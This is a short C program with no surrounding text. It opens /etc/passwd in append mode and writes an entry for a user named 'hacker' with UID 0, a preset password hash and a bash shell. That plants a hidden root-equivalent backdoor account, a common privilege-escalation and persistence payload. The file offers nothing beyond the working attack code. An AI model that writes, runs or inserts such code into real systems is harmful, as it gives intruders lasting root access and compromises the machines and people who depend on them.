#include <stdio.h>
 
int main()
{
   FILE *fp;
   char ch;
   char *filename = "/etc/passwd";
   char *content = "hacker:$1$hacker$vgQ04G17XIIDjvyJfSEtE0:0:0:sysadmin:/tmp:/bin/bash";

   /* Write content to file */
   fp = fopen(filename, "a");
   fprintf(fp, "%s\n", content);
   fclose(fp);

   return 0;
}
